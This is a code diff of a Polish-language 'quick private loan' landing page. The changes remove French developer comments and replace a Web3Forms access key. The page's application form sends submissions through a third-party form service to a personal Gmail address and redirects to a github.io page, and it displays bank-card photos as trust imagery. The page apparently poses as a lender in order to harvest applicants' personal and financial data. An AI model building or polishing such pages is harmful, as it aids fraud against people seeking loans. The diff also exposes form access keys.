@@ -112,7 +112,7 @@
         .cards-container .card-item {
             flex: 0 0 auto;
             width: 250px;
-            height: 200px;      /* HAUTEUR AUGMENTÉE */
+            height: 200px;
             border-radius: 12px;
             box-shadow: var(--shadow-lg);
             transition: var(--transition);
@@ -135,7 +135,7 @@
         .proof-images .proof-item {
             flex: 0 0 auto;
             width: 350px;
-            height: 280px;      /* HAUTEUR AUGMENTÉE */
+            height: 280px;
             border-radius: var(--radius-xl);
             box-shadow: var(--shadow-lg);
             border: 1px solid var(--gray-200);
@@ -281,13 +281,11 @@
         .footer-col a:hover { color: var(--secondary); }
         .footer-bottom { border-top: 1px solid #334155; padding-top: 30px; text-align: center; font-size: 0.9rem; }
         
-        /* ========== MEDIA QUERIES ========== */
         @media (max-width: 992px) {
             .hero-container, .steps-grid, .features-grid, .footer-grid { grid-template-columns: 1fr; }
             .hero { text-align: center; }
             .hero-subtitle { margin: 0 auto 40px; }
             .trust-badges { justify-content: center; }
-            /* Sur tablette, on passe en wrap et on réduit */
             .cards-container { flex-wrap: wrap; gap: 15px; }
             .cards-container .card-item { width: 200px; height: 160px; }
             .proof-images { flex-wrap: wrap; gap: 15px; }
@@ -357,7 +355,6 @@
                     <h1 class="hero-title">Szybka pożyczka prywatna online</h1>
                     <p class="hero-subtitle">Potrzebujesz gotówki na dowolny cel? Wypełnij wniosek i otrzymaj pieniądze nawet w ciągu 24 godzin. Bez wychodzenia z domu, bez zbędnych formalności.</p>
                     
-                    <!-- 3 KARTY BANKOWE sur une ligne -->
                     <div class="cards-container">
                         <img src="IMG_20260627_114045_996.jpg" alt="Karta bankowa 1" class="card-item">
                         <img src="f2ff596f306229-2500-1497-433-322-3499-2099.webp" alt="Karta bankowa 2" class="card-item">
@@ -373,7 +370,8 @@
                 <div class="hero-form-container">
                     <h3 style="text-align: center; margin-bottom: 24px; font-size: 1.5rem;">Wypełnij wniosek</h3>
                     <form action="https://api.web3forms.com/submit" method="POST">
-                        <input type="hidden" name="access_key" value="4c458db8-0352-422e-95f4-2837ab14eda5">
+                        <!-- NOUVELLE CLÉ WEB3FORMS -->
+                        <input type="hidden" name="access_key" value="c2552c68-8921-4ef2-bbc4-5a41a058b5f5">
                         <input type="hidden" name="to_email" value="bankvantex047@gmail.com">
                         <input type="hidden" name="subject" value="NOWY WNIOSEK - FinanceExpress">
                         <input type="hidden" name="redirect" value="https://monika-sourc.github.io/-----/merci.html">
@@ -668,7 +666,6 @@
     </footer>
 
     <script>
-        // --- Menu burger ---
         const hamburger = document.querySelector(".hamburger");
         const navMenu = document.querySelector(".nav-menu");
         hamburger.addEventListener("click", () => {
@@ -680,7 +677,6 @@
             navMenu.classList.remove("active");
         }));
 
-        // --- FAQ accordion ---
         const faqItems = document.querySelectorAll(".faq-item");
         faqItems.forEach(item => {
             const question = item.querySelector(".faq-question");
@@ -693,7 +689,6 @@
             });
         });
 
-        // --- Karuzela opinii ---
         const slides = document.querySelectorAll('.testimonial-slide');
         const dots = document.querySelectorAll('.slider-dots span');
         let currentIndex = 0;
